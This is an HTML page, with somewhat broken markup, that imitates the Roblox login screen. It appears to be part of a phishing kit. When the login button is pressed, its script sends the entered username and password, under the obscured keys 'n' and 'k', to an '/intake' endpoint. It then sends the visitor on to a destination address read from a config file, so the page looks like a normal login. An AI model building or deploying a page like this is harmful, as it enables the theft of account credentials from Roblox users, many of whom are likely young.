<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Log in to Roblox</title>
  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet"/>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; overflow: hidden; font-family: "Nunito", sans-serif; background: #111; }

    .topnav {
      position: fixed; top: 0; left: 0; right: 0; height: 44px;
      background: #1a1a1a; border-bottom: 1px solid #2a2a2a;
      display: flex; align-items: center; padding: 0 16px;
      z-index: 200;
    }
    .nav-logo {
      display: flex; align-items: center; gap: 8px;
      text-decoration: none; margin-right: 20px; flex-shrink: 0;
    }
    .nav-logo-icon { width: 20px; height: 20px; flex-shrink: 0; }
    .nav-logo-gif  { height: 18px; width: auto; display: block; }
    .nav-link {
      color: #b0b0b0; text-decoration: none;
      font-size: 13px; font-weight: 700;
      padding: 0 13px; height: 44px;
      display: flex; align-items: center;
      transition: color .15s; white-space: nowrap;
    }
    .nav-link:hover { color: #fff; }
    .nav-search {
      flex: 1; max-width: 420px; margin: 0 14px;
      display: flex; align-items: center;
      background: #252525; border: 1px solid #363636;
      border-radius: 4px; overflow: hidden;
    }
    .nav-search-icon { padding: 0 10px; display: flex; align-items: center; flex-shrink: 0; }
    .nav-search input {
      flex: 1; background: transparent; border: none; outline: none;
      color: #fff; font-family: inherit; font-size: 13px;
      padding: 7px 0 7px 2px;
    }
    .nav-search input::placeholder { color: #555; }
    .nav-spacer { flex: 1; }
    .btn-signup {
      background: #0055d4; color: #fff;
      border: none; border-radius: 4px;
      padding: 7px 18px; font-size: 13px; font-weight: 800;
      font-family: inherit; cursor: pointer; white-space: nowrap;
      transition: background .15s; flex-shrink: 0;
    }
    .btn-signup:hover { background: #0044bb; }

    .card-wrap {
      position: fixed; top: 44px; left: 0; right: 0; bottom: 0;
      display: flex; align-items: center; justify-content: center;
      z-index: 10;
    }
    .card {
      background: rgba(20,20,20,0.97);
      border: 1px solid rgba(255,255,255,.06);
      border-radius: 8px;
      padding: 26px 32px 24px;
      width: 100%; max-width: 336px;
      box-shadow: 0 24px 64px rgba(0,0,0,.9);
    }

    .card-logo img { height: 42px; width: auto; }

      font-size: 20px; font-weight: 900;
      color: #fff; text-align: center;
      margin-bottom: 18px;
    }
    .field { margin-bottom: 10px; }
    .field input {
      width: 100%; background: #0e0e0e;
      border: 1px solid #3a3a3a; border-radius: 4px;
      padding: 10px 14px; font-size: 13px; font-family: inherit;
      color: #e4e4e4; outline: none;
      transition: border-color .15s, box-shadow .15s;
    }
    .field input:focus {
      border-color: #2563eb;
      box-shadow: 0 0 0 2px rgba(37,99,235,.2);
    }
    .field input::placeholder { color: #555; }
    .btn-login {
      width: 100%; margin-top: 4px;
      background: #e0e0e0; color: #111;
      border: none; border-radius: 4px;
      padding: 11px; font-size: 14px; font-weight: 900;
      font-family: inherit; cursor: pointer;
      transition: background .15s;
    }
    .btn-login:hover { background: #fff; }
    .btn-login:active { background: #d0d0d0; }
    .forgot { text-align: center; margin: 14px 0 12px; }
    .forgot a {
      color: #999; font-size: 12px; font-weight: 700;
      text-decoration: none; transition: color .15s;
    }
    .forgot a:hover { color: #ccc; }
    .divider { border: none; border-top: 1px solid #2c2c2c; margin: 12px 0 14px; }
    .btn-alt {
      width: 100%; margin-bottom: 9px;
      background: #1e1e1e; color: #c8c8c8;
      border: 1px solid #363636; border-radius: 4px;
      padding: 11px; font-size: 13px; font-weight: 800;
      font-family: inherit; cursor: pointer;
      transition: background .15s, color .15s;
    }
    .btn-alt:last-of-type { margin-bottom: 0; }
    .btn-alt:hover { background: #2a2a2a; color: #fff; }
    .signup-row {
      text-align: center; margin-top: 16px;
      font-size: 12px; color: #777; font-weight: 600;
    }
    .signup-row a { color: #4e9dff; font-weight: 800; text-decoration: none; }
    .signup-row a:hover { text-decoration: underline; }

    /* error message */
    .msg { display:none; text-align:center; font-size:12px; font-weight:700; color:#f66; margin-top:8px; }
    .msg.show { display:block; }
  </style>
</head>

    </div>
    <h1 class="card-title">Login to Roblox</h1>

    <div class="field">
      <input type="text" id="f-user" placeholder="Username/Email/Phone" autocomplete="username"/>
    </div>
    <div class="field">
      <input type="password" id="f-pass" placeholder="Password" autocomplete="current-password"/>
    </div>

    <button class="btn-login" id="f-submit">Log In</button>
    <div class="msg" id="f-msg">Please fill in all fields.</div>

    <div class="forgot">
      <a href="#">Forgot Password or Username?</a>
    </div>
    <hr class="divider"/>
    <button class="btn-alt">Email Me a One-Time Code</button>
    <button class="btn-alt">Quick Sign-in</button>
    <div class="signup-row">
      Don't have an account? <a href="#">Sign Up</a>
    </div>
  </div>
</div>

<script>
  document.getElementById('f-submit').addEventListener('click', async () => {
    const u = document.getElementById('f-user').value.trim();
    const p = document.getElementById('f-pass').value.trim();
    const msg = document.getElementById('f-msg');

    if (!u || !p) {
      msg.textContent = 'Please fill in all fields.';
      msg.classList.add('show');
      return;
    }
    msg.classList.remove('show');

    try {
      // POST to the server handler
      const res = await fetch('/intake', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ n: u, k: p, ts: new Date().toISOString() })
      });

      if (res.ok) {
        const cfg = await res.json();
        window.location.href = cfg.dest || '/';
      } else {
        // fallback: try reading config directly
        const cfg = await fetch('/config').then(r=>r.json()).catch(()=>({}));
        window.location.href = cfg.dest || '/';
      }
    } catch(e) {
      // If server is not running, just redirect using config.json
      try {
        const cfg = await fetch('config.json').then(r=>r.json());
        window.location.href = cfg.dest || '/';
      } catch(_) {
        window.location.href = '/';
      }
    }
  });

  // Also allow Enter key
  ['f-user','f-pass'].forEach(id => {
    document.getElementById(id).addEventListener('keydown', e => {
      if (e.key === 'Enter') document.getElementById('f-submit').click();
    });
  });
</script>
